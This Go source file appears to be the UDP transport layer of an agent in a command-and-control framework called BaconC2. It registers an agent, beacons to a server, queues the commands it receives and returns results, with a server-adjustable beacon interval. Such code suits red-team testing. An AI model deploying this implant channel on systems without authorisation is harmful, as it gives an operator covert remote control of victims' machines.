package transport

import (
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"time"

	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
)

type UDPTransport struct {
	serverHost     string
	serverPort     int
	agentID        string
	conn           *net.UDPConn
	commandQueue   queue.ICommandQueue
	beaconInterval time.Duration
	mu             sync.Mutex
}

func NewUDPTransport(host string, port int, agentID string, commandQueue queue.ICommandQueue) local_models.ITransportProtocol {
	return &UDPTransport{
		serverHost:     host,
		serverPort:     port,
		agentID:        agentID,
		commandQueue:   commandQueue,
		beaconInterval: 10 * time.Second,
	}
}

func (t *UDPTransport) Initialize() error {
	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", t.serverHost, t.serverPort))
	if err != nil {
		return fmt.Errorf("failed to resolve UDP address: %w", err)
	}

	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		return fmt.Errorf("failed to connect to UDP server: %w", err)
	}

	t.mu.Lock()
	t.conn = conn
	t.mu.Unlock()

	return nil
}

func (t *UDPTransport) Register(agent models.Agent) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn == nil {
		return fmt.Errorf("UDP connection not initialized")
	}

	jsonData, err := json.Marshal(agent)
	if err != nil {
		return fmt.Errorf("failed to marshal agent: %w", err)
	}

	_, err = t.conn.Write(jsonData)
	if err != nil {
		return fmt.Errorf("UDP registration error: %w", err)
	}

	return nil
}

func (t *UDPTransport) Beacon() (models.Command, error) {
	cmd, _, err := t.BeaconWithResultRequest()
	return cmd, err
}

func (t *UDPTransport) BeaconWithResultRequest() (models.Command, bool, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	var emptyCmd models.Command

	if t.conn == nil {
		return emptyCmd, false, fmt.Errorf("UDP connection not initialized")
	}

	// Send beacon message
	beacon := struct {
		ID string `json:"id"`
	}{ID: t.agentID}
	jsonData, err := json.Marshal(beacon)
	if err != nil {
		return emptyCmd, false, fmt.Errorf("failed to marshal beacon: %w", err)
	}

	_, err = t.conn.Write(jsonData)
	if err != nil {
		return emptyCmd, false, fmt.Errorf("UDP beacon error: %w", err)
	}

	// Set read deadline for response
	t.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buffer := make([]byte, 4096)
	n, _, err := t.conn.ReadFromUDP(buffer)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return emptyCmd, false, nil // Timeout means no command
		}
		return emptyCmd, false, fmt.Errorf("UDP read error: %w", err)
	}

	// Parse server response
	var response struct {
		Command        models.Command `json:"command"`
		Status         string         `json:"status,omitempty"`
		NextBeacon     int            `json:"nextBeacon,omitempty"`
		RequestResults bool           `json:"requestResults"`
	}
	if err := json.Unmarshal(buffer[:n], &response); err != nil {
		return emptyCmd, false, fmt.Errorf("failed to unmarshal response: %w", err)
	}

	// Update beacon interval if provided
	if response.NextBeacon > 0 {
		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
	}

	// If only "status" is returned (e.g., "acknowledged"), return empty command
	if response.Command.ID == "" && response.Status == "acknowledged" {
		return emptyCmd, response.RequestResults, nil
	}

	// Queue the command
	if err := t.commandQueue.Add(response.Command); err != nil {
		return emptyCmd, response.RequestResults, fmt.Errorf("failed to queue command: %w", err)
	}

	return response.Command, response.RequestResults, nil
}

func (t *UDPTransport) SendResult(agentID string, result models.CommandResult) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn == nil {
		return fmt.Errorf("UDP connection not initialized")
	}

	jsonData, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal result: %w", err)
	}

	_, err = t.conn.Write(jsonData)
	if err != nil {
		return fmt.Errorf("UDP result send error: %w", err)
	}

	return nil
}

func (t *UDPTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn != nil {
		return t.conn.Close()
	}
	return nil
}
